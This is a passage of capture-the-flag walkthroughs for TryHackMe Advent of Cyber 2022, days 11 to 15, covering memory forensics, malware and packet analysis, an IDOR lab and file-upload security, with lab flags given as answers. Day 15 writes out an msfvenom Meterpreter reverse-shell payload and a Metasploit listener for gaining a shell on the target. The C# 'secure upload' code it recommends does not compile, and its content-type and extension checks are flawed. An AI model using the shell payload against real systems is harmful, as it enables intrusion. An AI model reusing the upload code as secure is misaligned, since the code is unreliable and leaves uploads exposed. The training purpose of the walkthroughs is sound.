modify value stored at that address to be a really high value (say 9999) such that we can pass through the snowball barrage without loosing all our HP and get Yet's flag: <code>THM{yetiyetiyetiflagflagflag}</code></p>"},{"location":"walkthroughs/thm/adventofcyber2022/day11/","title":"Day 11 - Memory Forensics","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day11/#introduction","title":"Introduction","text":"<p>Memory forensics is the analysis of volatile memory (RAM) that is in use when a computer is powered on. RAM is extremely quick and is the preferred method of storing and accessing data when a software is running.</p> <p>Memory forensics is an extremely important element when investigating a computer. A memory dump is a full capture of what was happening on the computer at the time. Memory dumps can be used for analysis at a later date.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day11/#volatility-tool","title":"Volatility (Tool)","text":"<p>Volatility is an open-source memory forensics toolkit written in Python. Volatility allows us to analyse memory dumps taken from Windows, Linux and Mac OS devices and is an extremely popular tool in memory forensics. For example, Volatility allows us to:</p> <ul> <li>List all processes that were running on the device at the time of the capture</li> <li>List active and closed network connections</li> <li>Use Yara rules to search for indicators of malware</li> <li>Retrieve hashed passwords, clipboard contents, and contents of the command prompt</li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day11/#ctf-questions","title":"CTF Questions","text":"<p>Begin by confirming the operating system of the device from which the memory dump was captured from.</p> <p><pre><code>elfmcblue@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.info\nVolatility 3 Framework 2.4.1\nProgress:  100.00PDB scanning finished                        \nVariableValue\n\nKernel Base0xf803218a8000\nDTB0x1ad000\nSymbolsfile:///home/elfmcblue/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/E0093F3AEF\n15D58168B753C9488A4043-1.json.xz\nIs64BitTrue\nIsPAEFalse\nlayer_name0 WindowsIntel32e\nmemory_layer1 FileLayer\nKdVersionBlock0xf80321cd23c8\nMajor/Minor15.18362\nMachineType34404\nKeNumberProcessors4\nSystemTime2022-11-23 10:15:56\nNtSystemRootC:\\Windows\nNtProductTypeNtProductWinNt\nNtMajorVersion10\nNtMinorVersion0\nPE MajorOperatingSystemVersion10\nPE MinorOperatingSystemVersion0\nPE Machine34404\nPE TimeDateStampMon Apr 14 21:36:50 2104\n</code></pre> The above result confirms that the memory dump is from a <code>Windows 10</code> machine.</p> <p>Let's lists all of the processes that were running at the time of the memory capture.</p> <pre><code>elfmcblue@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.pslist          \nVolatility 3 Framework 2.4.1\nProgress:  100.00   PDB scanning finished\nPID PPID  ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime  ExitTime  File output\n\n4 0 System  0xc0090b286040  141 - N/A False 2022-11-23 09:43:13.000000  N/A Disabled\n104 4 Registry  0xc0090b2dd080  4 - N/A False 2022-11-23 09:43:04.000000  N/A Disabled\n316 4 smss.exe  0xc0090e438400  2 - N/A False 2022-11-23 09:43:13.000000  N/A Disabled\n436 428 csrss.exe 0xc0090ea65140  10  - 0 False 2022-11-23 09:43:18.000000  N/A Disabled\n512 504 csrss.exe 0xc0090f35e140  12  - 1 False 2022-11-23 09:43:19.000000  N/A Disabled\n536 428 wininit.exe 0xc0090f2c0080  1 - 0 False 2022-11-23 09:43:19.000000  N/A Disabled\n584 504 winlogon.exe  0xc0090f383080  3 - 1 False 2022-11-23 09:43:19.000000  N/A Disabled\n656 536 services.exe  0xc0090e532340  5 - 0 False 2022-11-23 09:43:20.000000  N/A Disabled\n680 536 lsass.exe 0xc0090f3a5080  6 - 0 False 2022-11-23 09:43:20.000000  N/A Disabled\n792 656 svchost.exe 0xc0090fa33240  12  - 0 False 2022-11-23 09:43:22.000000  N/A Disabled\n820 536 fontdrvhost.ex  0xc0090f3a3140  5 - 0 False 2022-11-23 09:43:22.000000  N/A Disabled\n828 584 fontdrvhost.ex  0xc0090fa39140  5 - 1 False 2022-11-23 09:43:22.000000  N/A Disabled\n916 656 svchost.exe 0xc0090fad72c0  7 - 0 False 2022-11-23 09:43:23.000000  N/A Disabled\n1000  584 dwm.exe 0xc0090fb0b080  13  - 1 False 2022-11-23 09:43:24.000000  N/A Disabled\n380 656 svchost.exe 0xc0090fba9240  41  - 0 False 2022-11-23 09:43:25.000000  N/A Disabled\n420 656 svchost.exe 0xc0090fbbf280  15  - 0 False 2022-11-23 09:43:25.000000  N/A Disabled\n1116  656 svchost.exe 0xc0090fc2e2c0  16  - 0 False 2022-11-23 09:43:26.000000  N/A Disabled\n1124  656 svchost.exe 0xc0090fc302c0  16  - 0 False 2022-11-23 09:43:26.000000  N/A Disabled\n1204  656 svchost.exe 0xc0090fc2a080  19  - 0 False 2022-11-23 09:43:26.000000  N/A Disabled\n1256  4 MemCompression  0xc0090fa35040  34  - N/A False 2022-11-23 09:43:26.000000  N/A Disabled\n1292  656 svchost.exe 0xc0090fc752c0  2 - 0 False 2022-11-23 09:43:26.000000  N/A Disabled\n1436  656 svchost.exe 0xc0090fdb52c0  7 - 0 False 2022-11-23 09:43:28.000000  N/A Disabled\n\n--cropped for brevity--\n</code></pre> <p><code>PID 2040</code> with an <code>Image File Name = mysterygift.exe</code> seems peculiar.</p> <p>Let's analyze the process further.</p> <pre><code>elfmcblue@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.psscan --pid 2040\nVolatility 3 Framework 2.4.1\nProgress:  100.00   PDB scanning finished\nPID PPID  ImageFileName Offset(V) Threads Handles SessionId Wow64 CreateTime  ExitTime  File output\n\n2040  5888  mysterygift.exe  0xc0090b52e4c0  3 - 1 False 2022-11-23 10:15:19.000000  N/A Disabled\n</code></pre> <p>Let's use <code>windows.dumpfile</code> to export process <code>2040</code> for further analysis.</p> <pre><code>elfmcblue@aoc2022-day-11:~/volatility3$ python3 vol.py -f workstation.vmem windows.dumpfiles --pid 2040\n</code></pre> <p>The dump of the process binary shows a total of <code>16</code> files.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day12/","title":"Day 12 - Malware Analysis","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day12/#introduction","title":"Introduction","text":"<p>Malware is defined as software created to harm a computer or an entire network.</p> <p>Known common behaviours of malware are as follows:</p> <ul> <li>Network connections: Malware establishes internal and/or external network connections. External connections all remote access or for downloading staged payloads. Internal connections allow for lateral movement (or pivoting).</li> <li>Registry key modifications: Malware typically uses registry keys to establish persistence. A good example is <code>Registry Run Keys</code> which allows binaries to be autmatically executed when a user logs in or the machine boots up.</li> <li>File manipulations: Malware tends to download or create new files needed for its successful execution.</li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day12/#dangers-of-analysing-malware-samples","title":"Dangers of Analysing Malware Samples","text":"<p>Warning</p> <p>Handling a malware sample is dangerous. Always consider precautions while analysing it.</p> <p>Following are some helpful tips when handling live malware:</p> <ul> <li>Always assume that the malware samples will infect your device and as such, executing it is not always the first step in analysing it.</li> <li>Only run the malware sample in a controlled environment that prevents potential compromise of unwanted assests.</li> <li>It is always recommended to have your <code>sandbox</code> to allow for a worry-free execution of malware samples.</li> </ul> <p>A <code>sandbox</code> is a controlled test environment that mimics a legitimate end-user working environment to execute malware samples and learn their behavriour. A typical sandbox also provices automated analysis at the disposal of Security Analysts to determine if a binary from a set of malware samples requires further manual investigation.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day12/#static-and-dynamic-analysis","title":"Static and Dynamic Analysis","text":"<ul> <li>Static Analysis: A way of analysing malware sample without executing it. This method mainly focuses on profiling the binary with its readable information (such as its properties, program flow, and strings).</li> <li>Dynamic Analysis: A way of analysing malware samples by executing it in a safe sandboxed environment. By doing this, you will see the malware live in action, its exact behaviour, and how it infects the environment.</li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day12/#ctf-questions","title":"CTF Questions","text":"<p>Let's profile the <code>mysterygift</code> binary through static analysis. For this we will use two tools: </p> <ul> <li>Detect It Easy (DIE)</li> <li>CAPA</li> </ul> <p>DIE provides information about the file, such as its architecture, significant headers, packer used, and strings. Right click on the <code>mysterygift</code> binary and select <code>Detect IT Easy</code> in the context menu to begin analysis. Upon opening the file in DIE, we notice that the the binary was packed with <code>UPX(3.95)</code>. Packing malware is a common technique used by malware developers to compress, obfuscate or encrypt the binary. Due to this, contents such as significant strings and headers will not be immediately visible to Static Analysis Tools.</p> <p>Let's run CAPA. CAPA detects capabilities in executable files. May it be for the installation of a service, invocation of network connections, registry modifications and such.</p> <p><pre><code>C:\\Users\\Administrator\\Desktop\\Malware Sample&gt;capa mysterygift\nloading : 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 485/485 [00:00&lt;00:00, 1633.69     rules/s]\nmatching: 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 3/3 [00:02&lt;00:00,  1.11 functions/s]\nWARNING:capa:--------------------------------------------------------------------------------\nWARNING:capa: This sample appears to be packed.\nWARNING:capa:\nWARNING:capa: Packed samples have often been obfuscated to hide their logic.\nWARNING:capa: capa cannot handle obfuscation well. This means the results may be misleading or incomplete.\nWARNING:capa: If possible, you should try to unpack this input file before analyzing it with capa.\nWARNING:capa:\nWARNING:capa: Use -v or -vv if you really want to see the capabilities identified by capa.\nWARNING:capa:--------------------------------------------------------------------------------\n</code></pre> Given the CAPA output, we have verified that the malware sample is packed.  we previously fround from Detect It Easy that the binary is packed by UPX.</p> <p>Let's unpack the binary using UPX and re-analyse the binaries using CAPA.</p> <pre><code>FLARE Tue 12/13/2022 10:53:06.02\nC:\\Users\\Administrator\\Desktop\\Malware Sample&gt;upx -d mysterygift\n                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2020\nUPX 3.96w       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020\n\n        File size         Ratio      Format      Name\n   --------------------   ------   -----------   -----------\n    502169 &lt;-    227737   45.35%    win64/pe     mysterygift\n\nUnpacked 1 file.\n\nC:\\Users\\Administrator\\Desktop\\Malware Sample&gt;dir\n Volume in drive C has no label.\n Volume Serial Number is 0EBE-2DEE\n\n Directory of C:\\Users\\Administrator\\Desktop\\Malware Sample\n\n12/13/2022  10:56 AM    &lt;DIR&gt;          .\n12/13/2022  10:56 AM    &lt;DIR&gt;          ..\n11/04/2022  05:25 AM           502,169 mysterygift\n12/13/2022  10:53 AM         2,016,605 mysterygift.viv\n               2 File(s)      2,518,774 bytes\n               2 Dir(s)  30,772,412,416 bytes free\n</code></pre> <p>With the binary unpacked, we can re-analyze the binary using CAPA. However before we can continue, we need to delete the <code>mysterygift.viv</code> cached results which forces CAPA to re-analyze the binary with accurate results.</p> <pre><code>C:\\Users\\Administrator\\Desktop\\Malware Sample&gt;del mysterygift.viv\n</code></pre> <p>Re-run CAPA.</p> <pre><code>C:\\Users\\Administrator\\Desktop\\Malware Sample&gt;capa mysterygift\nloading : 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 485/485 [00:00&lt;00:00, 1633.69     rules/s]\nmatching: 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 573/573 [00:16&lt;00:00, 34.27 functions/s]\n+------------------------+------------------------------------------------------------------------------------+\n| md5                    | 4e0321d7347cc872a5ac8ca7220b0631                                                   |\n| sha1                   | 2dfcba8c182e4ea7665c44054d46549cc7b4430a                                           |\n| sha256                 | 647458e71aea13d92e944bc7b7f305c6da808c71c3d19dc255a96dd60c8800a7                   |\n| path                   | mysterygift                                                                        |\n+------------------------+------------------------------------------------------------------------------------+\n\n+------------------------+------------------------------------------------------------------------------------+\n| ATT&amp;CK Tactic          | ATT&amp;CK Technique                                                                   |\n|------------------------+------------------------------------------------------------------------------------|\n| DEFENSE EVASION        | Obfuscated Files or Information [T1027]                                            |\n| DISCOVERY              | File and Directory Discovery [T1083]                                               |\n|                        | System Information Discovery [T1082]                                               |\n| EXECUTION              | Shared Modules [T1129]                                                             |\n| PERSISTENCE            | Boot or Logon Autostart Execution::Registry Run Keys / Startup Folder [T1547.001]  |\n+------------------------+------------------------------------------------------------------------------------+\n\n+-----------------------------+-------------------------------------------------------------------------------+\n| MBC Objective               | MBC Behavior                                                                  |\n|-----------------------------+-------------------------------------------------------------------------------|\n| ANTI-BEHAVIORAL ANALYSIS    | Debugger Detection::Software Breakpoints [B0001.025]                          |\n| DATA                        | Check String [C0019]                                                          |\n|                             | Encoding::Base64 [C0026.001]                                                  |\n|                             | Non-Cryptographic Hash::MurmurHash [C0030.001]                                |\n| DEFENSE EVASION             | Obfuscated Files or Information::Encoding-Standard Algorithm [E1027.m02]      |\n| FILE SYSTEM                 | Read File [C0051]                                                             |\n|                             | Write File [C0052]                                                            |\n| MEMORY                      | Allocate Memory [C0007]                                                       |\n| PROCESS                     | Terminate Process [C0018]                                                     |\n+-----------------------------+-------------------------------------------------------------------------------+\n\n+------------------------------------------------------+------------------------------------------------------+\n| CAPABILITY                                           | NAMESPACE                                            |\n|------------------------------------------------------+------------------------------------------------------|\n| check for software breakpoints                       | anti-analysis/anti-debugging/debugger-detection      |\n| compiled with Nim                                    | compiler/nim                                         |\n| encode data using Base64                             | data-manipulation/encoding/base64                    |\n| reference Base64 string                              | data-manipulation/encoding/base64                    |\n| hash data using murmur3 (2 matches)                  | data-manipulation/hashing/murmur                     |\n| contain a resource (.rsrc) section                   | executable/pe/section/rsrc                           |\n| contain a thread local storage (.tls) section        | executable/pe/section/tls                            |\n| query environment variable                           | host-interaction/environment-variable                |\n| check if file exists                                 | host-interaction/file-system/exists                  |\n| read file (3 matches)                                | host-interaction/file-system/read                    |\n| write file (4 matches)                               | host-interaction/file-system/write                   |\n| get thread local storage value                       | host-interaction/process                             |\n| allocate RWX memory                                  | host-interaction/process/inject                      |\n| terminate process                                    | host-interaction/process/terminate                   |\n| parse PE header (2 matches)                          | load-code/pe                                         |\n| reference startup folder                             | persistence/startup-folder                           |\n+------------------------------------------------------+------------------------------------------------------+\n</code></pre> <p>With the knowledge gained from CAPA, let's begin Dynamic Malware Analysis.</p> <p>Open Process Monitor. This Windows tool shows real-time registry, file system, and process/thread activity. Set the filter condition to <code>Process Name - is - mysterygift.exe</code> and press <code>Add</code> to add the filter and press <code>OK</code> to accept.</p> <p>Rename the binary with the extension <code>.exe</code> and execute the binary.</p> <p>ProcMon has a panel that can filter the following, as highlighted in the image below (in sequence):</p> <ul> <li>Show Registry Activity</li> <li>Show File System Activity</li> <li>Show Network Activity</li> <li>Show Process and Thread Activity</li> <li>Show Profiling Events</li> </ul> <p>Focus on the first three; Registry, File System and Network.</p> <p>Let's determine if any significant Registry Modifications are executed by the binary.</p> <p>Unclick all filters and only choose <code>Show Registry Activity</code>. The results still give several results so let's add a filter by finding all Registry Key Creations and Modifications. </p> <p>Remove the following Operations by right-clicking an entry from the Operation column and choosing <code>Exclude</code>:</p> <ul> <li>RegOpenKey</li> <li>RegQueryValue</li> <li>RegQueryKey</li> <li>RegCloseKey</li> </ul> <p>This leaves only the <code>RegCreateKey</code> as our results. In the results, only one Registry Key (Key: <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>; Value: <code>C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wishes.bat</code>) has both the <code>RegCreateKey</code> and <code>RegSetValue</code>. This key is related to a persistence technique called <code>Registry Run Key Modification</code> and is commonly used by malware developers to install a backdoor.</p> <p>Let's now determine if the malware sample executes File Creations. It may indicate that the malware drops prerequisite files for its successful execution.</p> <p>Select the <code>Show File System Activity</code> filter and filter on <code>File Write</code> events. This can be done by choosing <code>Exclude</code> for the following:</p> <ul> <li>CreateFile</li> <li>CreateFileMapping</li> <li>QuerySecurityFile</li> <li>QueryNameInformationFile</li> <li>QueryBasicInformationFile</li> <li>CloseFile</li> <li>ReadFile</li> </ul> <p>It looks like the malware writes two files:</p> <ul> <li>C:\\Users\\Administrator\\AppData\\Local\\Temp\\2\\test.jpg</li> <li>C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wishes.bat</li> </ul> <p>The first file is located in the user's <code>TEMP</code> directory, which is commonly used by malware to drop another file for its disposal. The other file is written in the <code>STARTUP</code> directory, also used for persistence via <code>Startup Folders</code>.</p> <p>Let's confirm if the malware sample attempts to make a network connection. It may indicate that the malware communicates with external resources to download or establish remote access.</p> <p>Select the <code>Show Network Activity</code> filter. We can see that the malware makes the following network connections:</p> <ul> <li>bestfestivalcompany.thm</li> <li>virustotal.com</li> </ul> <p>For the final question, we can go back and analyse the unpacked binary in DIE. Use the <code>Strings</code> feature and filter on <code>bestfestivalcompany.thm</code> to get the full URL: <code>http://bestfestivalcompany.thm/favicon.ico</code>.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day13/","title":"Day 13 - Packet Analysis","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day13/#introduction","title":"Introduction","text":"<p>Packets are the most basic unit of the network data transferred over a network. When a message is sent from one host to another, the data is transmitted in small chunks known as packets. Packet analysis is the process of extracting, assessing and identifying network patterns such as connections, shares, commands and other network activitie from captured traffic files.</p> <p>A packet capture (<code>PCAP</code>) of network events provides a rich data soruce for analysis. Capturing live data can be focused on traffice flow, which only provides statistics on the network traffic.</p> <p>Identifying and investigating network patterns in-depth is done at the packet level and as a result, threat detection and real-time perfornace troubleshooting cannot be done without packet analysis.</p> <p>There are various points to consider before conducting packet analysis.</p> Point Details Network and standard protocols knowledge Knowledge of network and protocol operations is a must. An analyst must know how the protocols work and which protocol provices particular information that needs to be used for analysis. Knowning \"normal\" and \"abnormal\" behaviours is key. Familiarity with attack and defence concepts An analyst must know how attacks are conducted to identify what is happening and decide where to look. Simply put, you can't detect what you don't know. Practical experience in analysis tools An analyst must know how to use the tools to extract particular information from packet bytes. <p>Creating checklists makes the packet analysis process considerably easier. A simple process checklist for practical packet analysis is shown below.</p> Required Check Details Hypothesis The analyst should know what to look for before starting an analysis. Packet Statistics Viewing the packet statistics can show the analyst the weight of the traffic in the capture file. It helps analysts see the big picture in terms of protocols, endpoints and conversations. Known Services The services used in everyday operations like web browsing, file sharing and mailing are called known services. An analyst should know which protocol is associated with which service. Sometimes adversaries use the known services for their benefit, so it is important to know what \"normal\" traffic looks like.Note: Service is a capability/application that facilitates network operations between users and applications. The protocol is a set of rules that identify the data processing and transmission over the network. Unknown Services Unknown services are potential red flags. Ananalyst should know how to research unknown protocols and services and quickly use them for the sake of the analysis. Known patterns Known patterns represent the analyst's knowledge and experience. An analyst should know the most common and recent case patterns to successfully detect the anomalies at first glance. Environment An analyst has to know the nature and dynamics of the working environment. This includes IP address blocks, hostname and username structure, used services, external resources, maintenance schedules, and average traffic load."},{"location":"walkthroughs/thm/adventofcyber2022/day13/#ctf-questions","title":"CTF Questions","text":"<p>Open the <code>.pcap</code> file in <code>Wireshark</code> and navigate to <code>Statistics --&gt; Protocol Hierarchy</code>. Percent Packets value for HTTP is <code>0.3</code>.</p> <p>Navigating to <code>Stastics --&gt; Conversations</code> and switching to the <code>TCP</code> tab shows that port <code>3389</code> (associated typically with <code>RDP</code>) received more than 1000 packets.</p> <p>In the main packet view window, apply <code>DNS</code> filter to narrow the packet view to just DNS traffic. Click on the packets and expand the <code>Domain Name System --&gt; Queries</code> section to show the interacted domains: <code>bestfestivalcompany[.]thm</code> and <code>cdn[.]bandityeti[.]thm</code>.</p> <p>Remove the DNS filter and apply <code>HTTP</code> filter to narrow the view to just HTTP packets. Looking at the HTTP packets, we can see the names of the two files requested by the client (10[.]10[.]29[.]186): <code>favicon[.]ico</code> and <code>mysterygift[.]exe</code>. The malicious file was hosted by <code>cdn[.]bandityeti[.]exe</code>.</p> <p>Analyzing the <code>GET</code> packet for <code>favicon[.]ico</code> file, we can see that the user-agen used to download the file was <code>Nim httpclient/1.6.8</code>.</p> <p>Let's further analyze the files. Export the files using <code>File --&gt; Export Object --&gt; HTTP</code> and select <code>Save All</code> option. We can calculate the SHA256 sum of <code>mysterygift[.]exe</code> and search for more information on <code>virustotal.com</code>.</p> <pre><code>$ sha256 mystergift.exe\n0ce160a54d10f8e81448d0360af5c2948ff6a4dbb493fe4be756fc3e2c3f900f\n</code></pre> <p>On <code>VirusTotal</code> under the <code>Behaviour</code> section we can see the contacted IP addresses associated with malicious file: <code>20[.]99[.]133[.]109</code>, <code>20[.]99[.]184[.]37</code> and <code>23[.]216[.]147[.]76</code>.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day14/","title":"Day 14 - Web Applications","text":"<p>Browse to <code>http://10.10.57.168:8080</code> and authenticate with <code>mcskidy:devtest</code>.</p> <p>Navigate to <code>http://10.10.57.168:8080/users/105</code> to reach <code>Elf Pivot McRed</code> profile page. The office number listed on profile is <code>134</code>.</p> <p>Right-click on any image on the profile and copy the image location. Paste the address into the address bar and modify the URL to <code>10.10.57.168:8080/images/100.png</code> to retrieve the flag <code>THM{CLOSE_THE_DOOR}</code></p>"},{"location":"walkthroughs/thm/adventofcyber2022/day15/","title":"Day 15 - Secure Coding (Securing File Upload)","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day15/#unrestricted-file-uploads","title":"Unrestricted File Uploads","text":"<p>Poor handling of file uploads can lead to serious vulnerabilities ranging from minor annoyances to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. </p> <p>Unrestricted file uploads usually have two main exploitation paths:</p> <ul> <li>Code execution if the uploaded file can be retrieved/accessed.</li> <li>Uploaded files viewed by another user can be a vector for a phishing attack via embeded malware in the uploaded file to execute code.</li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day15/#web-root","title":"Web Root","text":"<p>When a resource is requested with a specific file type (eg. ASP, ASPX, CSHTML, PHP), the webserver will first execute the instructions found in the resource before sending the compiled response back to the user.</p> <p>With unrestricted file upload allowed, an attacker could upload one of these special types of files with malicious code. If this file is stored in the <code>web root</code>, the attacker could request the file from the server, thus forcing the server to execute the code within the file before sending the response leading to <code>Remote Code Execution</code> on the server.</p> <p>If the malicious file is stored outisde the <code>web root</code>, an attacker cannot make a request that would retrieve the uploaded file. However, this protection is not sufficient for two main reasons:</p> <ul> <li>Vulnerabilities such as <code>Local File Inclusion (LFI)</code> may exist that allow an attacker to force the webserver itself to recover the file that was stored outside the web root. If the file is recoverable, the code within the file can be executed allowing for RCE.</li> <li>In cases were RCE may not be possible, knowing that a human will be interacting with the uploaded file opens up phishing vectors to allow malicious code to execution.</li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day15/#properly-securing-file-uploads","title":"Properly Securing File Uploads","text":"<p>To adequately secure a file upload feature, layers of defence need to be implemented. Let's use the following C# file upload as a case study.</p> <pre><code>public IActionResult OnPostUpload(FileUpload fileUpload)\n  {\n    var fullPath = \"D:\\CVUploads\\\"\n    var formFile = fileUpload.FormFile;\n    var filePath = Path.Combine(fullPath, formFile.FileName);\n\n    Using (var stream = System.IO.File.Create(filePath))\n    {\n      formFile.CopyToAsync(stream);\n    }\n  }\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day15/#file-content-validation","title":"File Content Validation","text":"<p>The content of a file can be validated by reviewing the <code>ContentType</code> header in the server response when the file is uploaded. If the file content type is not what is expected, the file should be rejected. It should be noted that the <code>ContentType</code> header can be manipulated by intercepting the requested using <code>Burp Suite</code>.</p> <p>The example below validates the <code>ContentType</code> header and rejects the file if it does not match <code>PDF</code>.</p> <pre><code>string contentType = fileUpload.ContentType.Split('/')[1].ToLower();\nif !(contentType.equals(\"ContentType=PDF\")\n    {\n        allowed = False;\n    }\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day15/#file-extension-validation","title":"File Extension Validation","text":"<p>Validating file extensions for uploaded files is another good way of adding another layer of defence. Ideally, file extension validation should be implemented with an <code>allowlist</code> rather than a <code>rejectlist</code> (ie. default reject-all except what is on the allowlist) since a blocklist can still be bypassed in certain cases.</p> <p>In the following example, the extension of the uploaded file is compared to the allowed list (PDF). If the extension does not match, the file is rejected.</p> <pre><code>string contentExtension = Path.GetExtension(fileUpload);\nif !(contentExtension.equals(\"PDF\"))\n    {\n        allowed = False;\n    }\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day15/#file-size-validation","title":"File Size Validation","text":"<p>File size validation is a good practice to ensure that a threat actor does not upload a large size file thereby filling up the space allocated on the webserver. This can result in a psuedo <code>Denial of Service</code> attack on other users who might wish to upload files.</p> <p>The following example, limits uploaded file size to 10Mb.</p> <pre><code>int contentSize = fileUpload.ContentLength;\n//10Mb max file size\nint maxFileSize = 10 * 1024 * 1024\nif (contentSize &gt; maxFileSize)\n    {\n        allowed = False;\n    }\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day15/#file-renaming","title":"File Renaming","text":"<p>Eventhough the uploaded files are stored outside the <code>web root</code>, an attacker could leverage <code>LFI</code> vulnerabilities to execute malicious code contained in the file. A good counter to this is to randomize the name of the uploaded file to prevent the attacker from recovering their file by name (IDOR and LFI).</p> <pre><code>Guid id = Guid.NewGuid();\nvar filePath = Path.Combine(fullPath, id + \".pdf\");\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day15/#malware-scanning","title":"Malware Scanning","text":"<p>The addition of above mentioned controls still contains the risk of an attacker uploading a malicious file with the aim of exploiting the phishing attack vector. A good practice is to scan the uploaded file for any malicious code using a malware scanner such as <code>ClamAV</code>.</p> <pre><code>var clam = new ClamClient(this._configuration[\"ClamAVServer:URL\"],Convert.ToInt32(this._configuration[\"ClamAVServer:Port\"])); \nvar scanResult = await clam.SendAndScanFileAsync(fileBytes);  \n\nif (scanResult.Result == ClamScanResults.VirusDetected)\n    {\n        allowed = False;\n    }; \n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day15/#putting-it-all-together","title":"Putting it all Together","text":"<p>Implementing all of the above techniques gives us a much more secure file upload utility.</p> <pre><code>public IActionResult OnPostUpload(FileUpload fileUpload)\n    {\n        var allowed = True;\n\n        //Store file outside the web root   \n        var fullPath = \"D:\\CVUploads\\\"\n\n        var formFile = fileUpload.FormFile;\n\n        //Create a GUID for the file name\n        Guid id = Guid.NewGuid();\n        var filePath = Path.Combine(fullPath, id + \".pdf\");\n\n        //Validate the content type\n        string contentType = fileUpload.ContentType.Split('/')[1].ToLower();\n        if !(contentType.equals(\"ContentType=PDF\")\n            {\n                allowed = False;\n            }\n\n       //Validate the content extension\n       string contentExtension = Path.GetExtension(fileUpload);\n       if !(contentExtension.equals(\"PDF\"))\n           {\n               allowed = False;\n           }\n\n       //Validate the content size\n       int contentSize = fileUpload.ContentLength;\n       //10Mb max file size\n       int maxFileSize = 10 * 1024 * 1024\n       if (contentSize &gt; maxFileSize)\n           {\n               allowed = False;\n           }\n\n       //Scan the content for malware\n       var clam = new ClamClient(this._configuration[\"ClamAVServer:URL\"],Convert.ToInt32(this._configuration[\"ClamAVServer:Port\"])); \n       var scanResult = await clam.SendAndScanFileAsync(fileBytes);  \n\n       if (scanResult.Result == ClamScanResults.VirusDetected)\n           {\n                allowed = False;\n           };\n\n       //Only upload if all checks are passed\n       if (allowed)\n       {\n            using (var stream = System.IO.File.Create(filePath))\n                {\n                    formFile.CopyToAsync(stream);\n                }\n       }\n    }\n</code></pre>"},{"location":"walkthroughs/thm/adventofcyber2022/day15/#ctf-questions","title":"CTF Questions","text":"<p>Experimenting with the file upload web-app, we find that the utility does not enforce any kind of file-type filtering. The application allows unrestricted file upload; however, the uploaded file is not directly accessible by us. We do know however that a person will physically be interacting with the file we upload which opens up the an exploit vector.</p> <p>Let's craft a malicious payload which we can upload using <code>msfvenom</code>.</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9999 -f exe -o cv.exe\n</code></pre> <p>Before uploading the file, let's fire up <code>Metasploit</code> and get our listener ready.</p> <pre><code>sudo msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 9999; exploit\"\n</code></pre> <p>Upload the file and wait for the callback. Drop into a <code>Meterpreter shell</code> using the command <code>shell</code>.</p> <p>Navigate to <code>C:\\Users\\HR_Elf\\Documents</code> and use <code>type flag.txt</code> to read-out the flag: 